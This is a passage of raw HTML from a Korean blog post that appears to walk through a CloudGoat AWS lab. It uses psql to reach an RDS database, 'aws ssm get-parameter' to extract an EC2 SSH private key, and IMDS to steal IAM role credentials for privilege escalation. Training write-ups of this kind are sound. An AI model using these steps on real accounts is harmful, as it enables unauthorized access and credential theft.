bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABpUlEQVQoz51Ta2+CQBBcAa3WKu9HAUFAQOqjVduaNE3//7+aZhel2jRp2g+Tu92D3dmZOyqaDNUmwdPrEo8vNXbHBrvjElFSIAhr+GGFMF4iiGq4wQL3UY1otkJW5ti8JGh2M6wOCdaHFKM7GzQYBlA1D8NRBK0fyMogmoJo8g2nXI/3OoiMaygGSO2bGAwdhLMl0mwNx8tgOSn8sITjFXC8HLabCzNmyLGiWeipOhTNgKLpp30bEyk61L6FRbXHevuG8SSUeDQOMLz1BbyXeOyfcp6sNyNP0H7rQdFM0NSYwbRTGFaK7e4ddfOMst7Dvy+hm+2Z5TLrefcds3T9AqY9F/AkPAUTIW1ggzHRY1RS7IA030I3ExkzTh6kAE/yG3oq66ixhq50nBoxiMYguhP6/4EwZA3OoxhWApaBD7njXyAFmSoXZUOe9h9SkAVnPS47c9zip5zVEaDzht1qVkeEcSMXmiXwgkUHznPOFoMyMag9K2Uydlm0PFPl6zLPt0izjbwM1vPLlKIT/RKXZnQaMl02JQgr6dq+hOnVD4zfzDg3+QRmoh4u1XaJxAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/04a5d8ec06e13eb2ce4ca4f4678418fa/37523/8.png\"\n        srcset=\"/static/04a5d8ec06e13eb2ce4ca4f4678418fa/e9ff0/8.png 180w,\n/static/04a5d8ec06e13eb2ce4ca4f4678418fa/f21e7/8.png 360w,\n/static/04a5d8ec06e13eb2ce4ca4f4678418fa/37523/8.png 720w,\n/static/04a5d8ec06e13eb2ce4ca4f4678418fa/b4098/8.png 816w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>이제 RDS 인스턴스에  연결하는데 있어서 필요한 모든 정보를 수집하였고 PostgreSQL 클라이언트를 사용하여 데이터베이스에 연결하고 비밀을 추출할 수 있습니다.</li>\n<li>해당 경우 <code class=\"language-text\">psql</code> 명령줄을 통해서 <code class=\"language-text\">postgreSQL</code> 클라이언트를 사용합니다. 앞에서 했던 방식으로 db 에 연결을 한 후 테이블을 조회하여 원하는 정보를 추출합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">psql <span class=\"token operator\">-</span>h <span class=\"token punctuation\">[</span>INSTANCE<span class=\"token operator\">-</span>PUBLIC<span class=\"token operator\">-</span>DNS<span class=\"token operator\">-</span>NAME<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span>p <span class=\"token number\">5432</span> <span class=\"token operator\">-</span>d securedb <span class=\"token operator\">-</span>U cgadmin\n\npsql <span class=\"token operator\">-</span>h secrets<span class=\"token operator\">-</span>instance<span class=\"token punctuation\">.</span>cklw91kahwum<span class=\"token punctuation\">.</span>us<span class=\"token operator\">-</span>east<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">.</span>rds<span class=\"token punctuation\">.</span>amazonaws<span class=\"token punctuation\">.</span>com <span class=\"token operator\">-</span>p <span class=\"token number\">5432</span> <span class=\"token operator\">-</span>d securedb <span class=\"token operator\">-</span>U cgadmin</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoElEQVQY05WRyw6FIAxEMRoVowI+AIUb48b//8Mx04Vr7uJkUpKeNlSt6wqttTCO45d1XUMphaqqJIsx1kqzcw7HcYhsmibEGDHPM0KIMqRYyCZCCWXWOfR9D2MMhmH46mIhN+u6Dm3bomkakVPGNw74S0aWZUHOGSkl5PzD8zzCfd9IKeO6Lnjvy4XbtoGHYfLf9t0jhIDzPCWJNaZY+AJU4IKzlDT73gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/02b889e2f14155b2cb981fafbfe91ef9/37523/9.png\"\n        srcset=\"/static/02b889e2f14155b2cb981fafbfe91ef9/e9ff0/9.png 180w,\n/static/02b889e2f14155b2cb981fafbfe91ef9/f21e7/9.png 360w,\n/static/02b889e2f14155b2cb981fafbfe91ef9/37523/9.png 720w,\n/static/02b889e2f14155b2cb981fafbfe91ef9/e3829/9.png 1077w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"ssmdescribeparameters\" style=\"position:relative;\"><a href=\"#ssmdescribeparameters\" aria-label=\"ssmdescribeparameters permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSM:DescribeParameters</h3>\n<ul>\n<li>앞에서 했던 방식과 다른 접근을 해보고자 합니다.</li>\n<li>일단은 제일 먼저 하는 Credential 정보를 통해서 사용가능한 권한이 무엇인지를 체크를 해야겠죠</li>\n<li><code class=\"language-text\">SSM:DescribeParameters</code> 권한을 소유하고 있는 것을 확인할 수 있습니다. 해당 권한은 IAM Crednential이 AWS System Manager Parameter Store에 저장된 파라미터를 나열 할 수 있도록 허용합니다.</li>\n<li>설계상 저장된 대부분의 매개변수는 취약합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAAB20lEQVQoz5VSaZeaQBAcUVYRREBuvDnEaz2QXXezieblJf//H1VeN0FN8iX5UNA9M6+6pmpEt2dhOIkxjTM4/hAdzYSsaJDlPqSWiUbTQFO2ILUs/tc17XEtmxCSiVbbhNw2IKgRDQOKGiLJTrDdBOmihB8uYLtzhhekcP0EA2fOoN4PM95TeyGEpPPgRtOEaPKEPhTVQ1FecCwveDl/wzzdIxotsdm9I1+VWCxLrLdnHE8X7IsvyFcvCIc5LHsGuWODeKSWAUHSiVDtBdgdPmO5fsVwvGJF4WjJpARSNIt3GE3WiMYr+NECcXrAeLaB66doKy6rrAgbOkun6Ul2RJaf4HgJhOg9QIcQ2h9rarXWqK5ccTUNyG0bqh4yCYGur+kRH3hEFci9bz0NGHXPCmtmTQ8xmW3Zk3my/2V6zCFQ7fgJ79FaEOUcmmVP8dRxWGFNeruyovo4v39HUV7x9ukH0rzgAbvDB5abV6w2ZzzvP1CUX9ka8pr8dLyY/bsprAlJ4fF0xXr7hmn8zE/DCzIOpK6JgJIluEHKIVGApJTs+DuU8srPg4KhlGn9N1AQdS31773Uv4dCHwql03VhDCbom2N0uh66WnA79K9gheTdTe7DRML/kNWEPwHnrCbow5XiHwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/34439cd41a828cefedd867e3ecf4fdc7/37523/10.png\"\n        srcset=\"/static/34439cd41a828cefedd867e3ecf4fdc7/e9ff0/10.png 180w,\n/static/34439cd41a828cefedd867e3ecf4fdc7/f21e7/10.png 360w,\n/static/34439cd41a828cefedd867e3ecf4fdc7/37523/10.png 720w,\n/static/34439cd41a828cefedd867e3ecf4fdc7/44fd6/10.png 789w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AWS 계정의 Parameter Store에 있는 모든 파라미터들을 나열하였습니다.</li>\n<li>Parameter Store에 EC2 SSH key-pair로 추정되는 <code class=\"language-text\">cg-ec2-private-key-codebuild_secrets_cgidq5cx1pvldn</code> 가 있음을 확인할 수 있스니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws ssm get<span class=\"token operator\">-</span>parameter \\\n    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>name cg<span class=\"token operator\">-</span>ec2<span class=\"token operator\">-</span>private<span class=\"token operator\">-</span>key<span class=\"token operator\">-</span>codebuild_secrets_cgidq5cx1pvldn \\\n    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>query <span class=\"token string\">\"Parameter.Value\"</span> \\\n    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>output text \\\n    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile solo</code></pre></div>\n<ul>\n<li><code class=\"language-text\">Paramteter.value</code> 를 대상으로 쿼리를 잡고 ssh private key 값을 추출 하겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAACIElEQVQ4y2VSa3MSQRBcgcTCBAKJhZBoSTARlTf34o47OJ4HAQIkJoao5Qcr/v9/0FYvbCTmw9T17sz09vSccIMTdOfv8O13Fde/ilg9aFj9KcGfdfAhb6FQspD/rONL0US56qBYdjC9y+P2IYfgJoXe8hDdZQKj+1doz/cghDhCKJxGsdTB2bmN7KmBUDiDaDSDyM4hhNiHELHNV+EDCBHfnIkTECK5jvenRZQqNgyrA930UdU8FMoWPhVMZHNlpI8/4k3mXIbCqcwZUumcjJfR1wjvJBDZTSC8m4BoeiM0nIEMYsPqwrL7MBs96GZH3tvNoTwzrzBrmNuPn0C8OEAokpQhSMBgUjM6srimtSXmve0GqOtt1A2qb0msGT4sey1iL3YMEdoiZCGV8EXLGcDxRhK3/Ik8k1ARk0BhKmWsFcb/EbKx3ZnKZjY4GwK3NZYjeu0L2chHnA0pMUmZf6aQl8ob5ReDhHyMd5zCsNa+Mccp3PZY5mIHb596aNr9Rw+pgEQMhalQqlLjktANoG+8XxNujVzTWrLB787g92ZoUGlzuFbtBrJZKfb8iQzlJx+LJ/4j5NY4ChsaWz6qJhJz8w3p4+BxIeb2b7PtITdcqXsbn7qo675s4K9RqbngBMwpAtbz96nWPZSr7vOlyC26AabzFYaja4wnt5hc3mFx9QOXi+/oD5dSMesWVz9lfnRxg2D8FbPFPZJH2Scj/wWWT5SO7rNttAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/64040f621e065565e0aafe58777c0edd/37523/11.png\"\n        srcset=\"/static/64040f621e065565e0aafe58777c0edd/e9ff0/11.png 180w,\n/static/64040f621e065565e0aafe58777c0edd/f21e7/11.png 360w,\n/static/64040f621e065565e0aafe58777c0edd/37523/11.png 720w,\n/static/64040f621e065565e0aafe58777c0edd/321ea/11.png 786w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 해당 개인 키를 다운르도 할 수 가 있고 이 키를 사용할 수 있는 AWS 계정에서 EC2 인스턴스가 있는지 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.111111111111107%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABWUlEQVQY0x3MSy8rYQDG8VfQ6mU6fWvMmOldXaY6bad1L72JCMJKJDYSiZRqunBwlCCiC2uRnK9wPoKv9xez+OWfZ/OI3uMSvacqZ/1ZuoMi148lrp+XKR2fUHC3qG1us7beotneo97cpdk6oNFu8Wfo8vpZ4e+Hy8tXmn/fIeqHCmI6kSZfdFFjOrmFRWynTG4+j6lnUCJxgmGTSDTpCSoWqkyhqHEmdQvdSqCZFlKziEQTjPokIpUpkkw5lCsNZueXMeN5VJlGyiSqTKLpM8S0jHciRIAxf8zbcjLLmE9DiDBCRBBCRYxEEbWtfbK5iqfg1DzFcoOF1R1S2RJSzqAbNsa0jWHYBEMJxn0Gfr/JRMDC57cIKVNolkogHEVc3a9z3i9zcVOlc7vE5a+HDeaOTqnvrXI3dOkOCty8VbkdrtAdLNK5t732nhw6dw79d5OP/6Ns7Cr8AITanDE7askFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/72292b92297157f66b16ae599b1f08e0/37523/12.png\"\n        srcset=\"/static/72292b92297157f66b16ae599b1f08e0/e9ff0/12.png 180w,\n/static/72292b92297157f66b16ae599b1f08e0/f21e7/12.png 360w,\n/static/72292b92297157f66b16ae599b1f08e0/37523/12.png 720w,\n/static/72292b92297157f66b16ae599b1f08e0/9a86a/12.png 792w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>EC2 인스턴스가 동작하고 있는 것을 확인할 수 있으며 이를 토대로 SSH 로 접속을 시도 해 보겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 73.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACBklEQVQ4y31U2W7bMBCk7ziODkuWJeugbst2fDsFijZA//+rpphVEhix2ocFFxR3ODs7lFosS+TlCYYVYzh24YdrhPEGOtsjCNeypvkBq6jB07MvZ3oDG/3hXOI+ZyhrruH5pUSUbGHaCWZGKOvczeB6BZxFhhczguvlsB0N1TOh+tYX2D2oqporLrc/wiTWOwGdznw4ixzLoMLp8o7j5V32Z8ZKmFrzRC7oZJikr1hv3qRttsjWR5MFxk8eprMAlqOFGde5m8K0Y8nJejh2HgH5oW5uyIojdH6QlZoV1VkYe0H1lTN4Jsn20Pn+QU8BpF5B1MDzK3BAzIOwEbYSUSOtM4/0TrRlB4xODXmAN7L1an2VQrLMq5Mw4x7lKOsLVtEGg5Hzz4EIoO2m0iJFZ1B0DojTpfgMXko3jCb/t4wAspgaUh+CcSVjenEwdqCU0dqkZ3ayemColAmlXtrCvtUWf+SfBd9bbNu2uzWkNofTLzTbH9jtfwpbaldvbmInfj+efyPl9IuDaEqNaaFOhiym6ByKWILDaa4o67OAM8r1Bf6qFh1bLyay0qudgAThYFjAp8UCmpqvhXuT6VJeBvNPMJqdZ763rWL9ijDaIi/PSLMDglUjrfEiOsCwY7mEL8iwWlBOnoz5FB8Y+kmOZZwh0AUCzbwQg/PPQvFZ0DXV+/37ofwFtoZ0NY2r8iYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/98058ff94b3baaade03aaffdb1d03fc1/37523/13.png\"\n        srcset=\"/static/98058ff94b3baaade03aaffdb1d03fc1/e9ff0/13.png 180w,\n/static/98058ff94b3baaade03aaffdb1d03fc1/f21e7/13.png 360w,\n/static/98058ff94b3baaade03aaffdb1d03fc1/37523/13.png 720w,\n/static/98058ff94b3baaade03aaffdb1d03fc1/5a6dd/13.png 802w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>서버에 접속되는 것을 확인할 수 있습니다.</li>\n</ul>\n<h3 id=\"imds-서비스를-이용한-열거\" style=\"position:relative;\"><a href=\"#imds-%EC%84%9C%EB%B9%84%EC%8A%A4%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-%EC%97%B4%EA%B1%B0\" aria-label=\"imds 서비스를 이용한 열거 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IMDS 서비스를 이용한 열거</h3>\n<ul>\n<li>EC2 인스턴스에 접근이 가능하기 때문에 IMDS 서비스를 사용하여 추가적으로 열거가 가능합니다.</li>\n<li>IMDS 를 사용하여 EC2인스턴스를 시작할 떄 지정된 사용자 데이터에 액세스가 가능합니다.</li>\n<li>사용자 데이터에는 중요 정보가 포함된는 경우가 대다수 입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABZUlEQVQozzVSaVPCQAwtIshZCqKl13IUWrq9y1lOHXXGGf//73lOUv2QSTabvLyXXWXhx/DCHMKV6Go6OqqOds9ATzXRUy2omoPB0IGq2dBGAuqQzoKt8TSGUlMrexigVtegxOkJMjqi2N7xoi8hphHmbgoxi2BPQ27s9g0GpyEUd3oGWh0d3b7JMeXb3QnqjRGU2SJBGB+RFlcE4QFxdkaUnpAVV8j4yMN8uUOSX7Ddv3NtlJTwgx3fr+UeYh7BsHw8Np+hLL0CaX7lAt1YwXICmPaa2VlCwnIkexq8WGawhYQzDTGx/KpOSFZDvQwYJiXO12/c3n6Y1eH0hTS/IN/cEEQHZk3DKP5XQawIPMnOrIAAp/O4AqREvr1jX36y1P3xg2VTfuVvuLnyO4RxyTEZ7dlbbxmYGJPkZmsMhZDpQciqnR3grnIs/YILaQUkm1gQiPPHZmL6mLkJ5yamh/Hrgn/BLx7jxmI1ccUwAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/feef4e01e2ca8781262cd1555eed7b21/37523/14.png\"\n        srcset=\"/static/feef4e01e2ca8781262cd1555eed7b21/e9ff0/14.png 180w,\n/static/feef4e01e2ca8781262cd1555eed7b21/f21e7/14.png 360w,\n/static/feef4e01e2ca8781262cd1555eed7b21/37523/14.png 720w,\n/static/feef4e01e2ca8781262cd1555eed7b21/b4098/14.png 816w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>링크 주소를 이용하여 EC2의 사용자 데이터에는 EC2 인스턴스에서 RDS 인스터에 연결하기 위한 명령들의 집합이 포함되어 있고</li>\n<li>해당 명령에는 RDS 인스턴스에 대한 Crendentail이 포함되어 있습니다.</li>\n</ul>\n<h3 id=\"imds-를-이용한-iam-crendentail-탈취\" style=\"position:relative;\"><a href=\"#imds-%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-iam-crendentail-%ED%83%88%EC%B7%A8\" aria-label=\"imds 를 이용한 iam crendentail 탈취 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IMDS 를 이용한 IAM Crendentail 탈취</h3>\n<ul>\n<li>EC2 인스턴스에 대한 액세스 권한을 얻은 경우 IMDS 서비스를 사용하여 IAM 자격 증명을 훔치는 것입니다.</li>\n<li>IAM Rule 을 EC2 인스턴스에 연결하는 것이 가장 일반적입니다.</li>\n<li>IAM Rule 을 사용하여 EC2 인스턴스는 AWS 계정의 다른 AWS 서비스와 상호 작용을 할 수 있습니다</li>\n<li>만약에 과도한 권한 이 부여되어있다면 이를 이용하여 권한 상승이 가능합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 60.55555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAACOklEQVQoz2VTa3OiQBDcxDwu0agIiIIREB/xjQ9AEEGiidHc5e7//5m+msmZqtR96Bp2d7a7Z5gVRbkOSXtESTGQL1dRkGoolAzc5WsoFHWUpCbKlSZHSTYhyRZktYWKQtHmqFRpbePmhwrhLjeYewkGYx+WM0arM4XlTNFqu3A6M3R6C7S7c9jdEezeEIbVhWpYkGsWNL3LItVaG3rjCfeFOkRN78G0J9CNJ9iOC73RZzWt3oGqOZBJXbUhKSYqismuczcScteECi6vJMb5WxSKBoaTkJ10enN2Uzd6XAoRErm4KEKIOwhxDyHyEKIAIYoQl6VvuMiViVDHYLTCYBSgN/BgtSbojwLMvS281Q4Td42mPYbRHODRHHJppj1GWTZxdVPhvp3BDm1nimXwjOksRhC9wF/tsPQzbNITsv0Hr9PsJ7bPv7B7+YM4OSLbfWCdvHFOGB8QhHs8739D1doQdCHZvvNlSqBvQpweEacnrNavn3vZO9abNyakPH/1SRKuXxFtDiyiVB0IckfOSInI/XCPVfQCj/bDPaL4wKAcck575yqInHLPomqtDdEf+nxISe484b55wY7Xs0XKTiiOpxG3haK7SDBfpl/7C+9TiOZSDMchE0T/HJIqkZBDdpEeuVQCOSEiukxrKv3snvpM8yhIIYh23GR3ESPJTlj4GfrDgP8mDTiVQq+BeqRoztdrOc8qgc74pZSUBrTHFoOeIUUiyD/UcXtXxfWtDCEevoPn8uE/0Bz+BcnVXdjgnpKeAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/cf5b7b19fea72b029f737bf943ed2732/37523/15.png\"\n        srcset=\"/static/cf5b7b19fea72b029f737bf943ed2732/e9ff0/15.png 180w,\n/static/cf5b7b19fea72b029f737bf943ed2732/f21e7/15.png 360w,\n/static/cf5b7b19fea72b029f737bf943ed2732/37523/15.png 720w,\n/static/cf5b7b19fea72b029f737bf943ed2732/3534c/15.png 808w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>탈취한 IAM Rule Credentail 은 다른 IAM Creadentail 처럼 사용할 수있습니다.</li>\n<li>해당 Rule credential을 사용하여 수행할 수 있는 작업들을 열거하기 위해 AWS 프로파일을 생성하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span>\n  <span class=\"token string\">\"Code\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string\">\"Success\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"LastUpdated\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-14T20:45:23Z\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Type\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string\">\"AWS-HMAC\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"AccessKeyId\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string\">\"&lt;ACCESS_KEY>\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"SecretAccessKey\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string\">\"&lt;ACCESS_SECRET_KEY>\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Token\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string\">\"&lt;ACCESS_SESSION_KEY>\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Expiration\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-15T03:11:47Z\"</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 71.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACZklEQVQ4yz1Ta1fiUAy86u5ZRUBRtvJ+v1oKlZY+KLRQEAFld///r5k9E6wfctLmJpPJ5F41MjyEqyNe7Rj2fAPLjuHYEYJgi2X8IWdxcoYXvMH1d1jsz3CTI7z1Cd7mBG97wurwF9u3f2h3Lajp6xLR+gNBuIfrb+Ev3uDzO9jBC3aYzdew52vMvQSOlyAM3xFFJ7heAstawmeTxR7L6Ihqw4Aiw1V8EqB1chZQGpswiT49pzG2WL6LsSEbhdFBcqp1HWpiLYUdExhMkzfbP/LPJum3NNh8IN58SjxcHSRGT1ma7QmUPvZhTkPMnBjjyQLGJECjZaLeMtHqTNFom6g3x6jURsKARd3+TGI0xmiMFbUONVyJ4NRpaLgC9lRsQSv1pKCodVFrGGi0JyhVBgLMQq3UlziN8WrdQOG5BTUYzaGbPgwzED3M6QK9gS2eC6s1x6DOZDAYOZL3+6WHTLaMbL7y5au4z1Xw606D4qgUm4ugdjNnLUVkTgnK1SF6Q1uY81qQAI3fKUuevVQGF0AW62NPjFrykGO1utNvQDKkDfQ5+kMHnZ4Fas/RbzMvuLsviV3/KFwYErTTe5UidmRnCk0AAhKEIzOHnuzImhrnH+tihefmhSFZETAdkwUEbX+x4ILINGXJGAEZ08p9KJWBun6Ausrj6uYRynE3uFgi9zEtGOquPEUy5AW2XT7LSBZHMHouj0A3P59kXBnZmq1km/RM4li8g5